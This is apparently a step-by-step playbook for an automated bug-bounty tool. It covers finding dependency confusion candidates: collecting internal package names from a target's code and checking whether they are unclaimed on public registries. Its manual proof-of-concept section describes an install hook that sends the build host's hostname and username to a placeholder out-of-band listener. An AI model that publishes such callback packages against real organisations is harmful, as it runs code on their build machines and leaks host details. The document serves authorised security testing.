# Dependency confusion — discovery and validation (read this first)

Dependency confusion: a build pulls a *public* package because an attacker
published it under the same name as the target's *private/internal* package,
with a higher version. The win is RCE on a build/dev machine. This phase finds
and VALIDATES the precondition automatically; the operator does the publish PoC
by hand (publishing is blocked for the run on purpose).

What makes a real candidate, in one line:
**an internal package name the target actually depends on, that is UNCLAIMED on
the matching public registry (or whose public scope is unclaimed).**

## 1. Collect candidate package names (two sources)

### a. The target's own JavaScript (already harvested in phase 06)
- Read the JS archive the js phase saved (see `hk handoff` for 06-js and its
  work dir), plus any bundles under the mapped hosts. Do NOT re-fetch target
  hosts needlessly - reuse what 06-js already pulled; fetch a missing bundle
  with curl (it goes through the proxy).
- Extract module specifiers robustly, not with a single fragile regex:
  - `require("X")`, `import ... from "X"`, `import("X")`, `from "X"`.
  - webpack/rollup maps: `__webpack_require__`, module tables, `"name":` in an
    inlined `package.json`.
  - For real structure use node's parser if available:
    `node -e 'const acorn=require("acorn"); ...'` or a small AST walk; fall back
    to careful regex when a parser is not installed.
- Keep only *package* specifiers. DROP relative/local paths (`./`, `../`, `/`),
  URLs, data: URIs, single letters, and pure webpack internals.

### b. The target's GitHub org (if known from the dork phase)
- Reuse the org from phase 01b (`hk handoff`, `hk leads`, notes). With
  $GITHUB_TOKEN, read manifests in the org's repos:
  - npm: `package.json` (`dependencies`, `devDependencies`, `peerDependencies`),
    `.npmrc` (scopes mapped to a private registry are a strong signal).
  - pip: `requirements.txt`, `setup.py`, `pyproject.toml`, `Pipfile`.
  - gem: `Gemfile`, `*.gemspec`.
- `.npmrc`/`.pip.conf` lines like `@acme:registry=https://nexus.acme.internal`
  or `--index-url https://pypi.acme.internal` tell you the scope/prefix that is
  private - every dependency under it is a candidate if unclaimed publicly.

## 2. Classify the ecosystem per name
- npm (default for JS): bare `name` or scoped `@scope/name`.
- pip: PEP 503 normalises names (lowercase, `-`/`_`/`.` collapse to `-`).
- gem: exact name.
- composer (PHP, `composer.json` `require`): `vendor/package`; check the whole
  `vendor` too (an unclaimed vendor namespace is the strong case).

## 3. Cross-reference the PUBLIC registry (read-only GET, the key test)
For each candidate, one GET decides it. 404 = unclaimed (candidate). 200 =
already public (usually NOT a candidate - it is a normal public dep) unless the
public owner is clearly unrelated and the target pins a higher internal version.
- npm:   `curl -s -o /dev/null -w "%{http_code}" https://registry.npmjs.org/<name>`
         (URL-encode a scope slash: `@acme/foo` -> `@acme%2Ffoo`)
- npm scope: if `@acme/*` is used, check whether the scope exists publicly at all
         (`https://registry.npmjs.org/-/org/acme/package` or try a known name);
         an **unclaimed scope** means every `@acme/x` is claimable - strong.
- pip:   `curl -s -o /dev/null -w "%{http_code}" https://pypi.org/pypi/<name>/json`
- gem:   `curl -s -o /dev/null -w "%{http_code}" https://rubygems.org/api/v1/gems/<name>.json`
- composer: `curl -s -o /dev/null -w "%{http_code}" https://repo.packagist.org/p2/<vendor>/<package>.json`

## 4. Filter to high confidence (avoid noise)
Keep a candidate only when ALL hold:
- the name is clearly a dependency the TARGET uses (its repo manifest or its own
  JS bundle - not a transitive mention in a third-party vendor blob);
- it is unclaimed publicly (404), or its scope is unclaimed;
- it is not a typo of a famous package (that is typosquatting, a different bug),
  and not an obvious placeholder/example/local name.
Scoped internal names (`@company/...`) with an unclaimed scope are the strongest
and cleanest to prove.

## 5. Record (NO publishing - that is the operator's manual step)
For each high-confidence candidate:
  `hk finding add --kind dependency-confusion --severity high --url <source: the
  github file URL or the JS bundle URL> --summary "internal <eco> package
  '<name>' used by <where> is unclaimed on <registry>" --steps "<source +
  evidence + the registry 404>" --impact "if a build resolves the public
  registry, an attacker-published <name>@<higher-version> runs on the build/dev
  host (RCE)"`.
Weaker/uncertain ones -> `hk add lead dependency-confusion <source-url>
--evidence "<name> on <eco>, registry says <code>"`.
Then `hk notify "Dependency confusion candidate" "<name> (<eco>) unclaimed -
source <url>"` so the operator sees it.

NEVER run `npm publish` / `twine upload` / `gem push` (the run blocks them). The
PoC below is for the OPERATOR to run by hand.

## 6. Operator's manual PoC (put these exact steps in the finding's notes)
Two-stage, human-in-the-loop:
1. **Reserve** immediately: publish a benign placeholder (version 1.0.0, empty
   scripts, a harmless index) so no one else claims the name.
2. After ~24h, **callback payload**: bump to a high version (e.g. 99.99.1) with a
   pre/postinstall that curls the operator's OOB listener with a per-package
   token, e.g. `http://<OOB_HOST>:<PORT>/depconf/<name>/?h=$(hostname)&u=$(whoami)`.
   (Use the run's OOB host from `hunt oob`.) A callback = confirmed.
3. **Attribute the callback**: ARIN/RDAP the source IP
   (`https://search.arin.net/rdap/?query=<ip>`). Ignore cloud/scanner ranges
   (AWS/GCP/Azure); a hit from the target's ASN or local ISP = a real build/dev
   machine = report it.
4. Release the name afterwards so the company can reclaim it, and say so in the
   report.
```
PKG=<name>; mkdir "$PKG"; cd "$PKG"
cat > package.json <<EOF
{ "name":"$PKG","version":"1.0.0","description":"placeholder","main":"index.js",
  "scripts":{}, "license":"ISC" }
EOF
echo '// benign placeholder' > index.js
# OPERATOR runs this by hand, not the automation:
#   npm publish --access public
```

## 7. Scale later
Same shape works for GitLab org scanning and other ecosystems (Maven groupId,
Go module paths) - add them as more sources without changing the registry-check
and record steps.
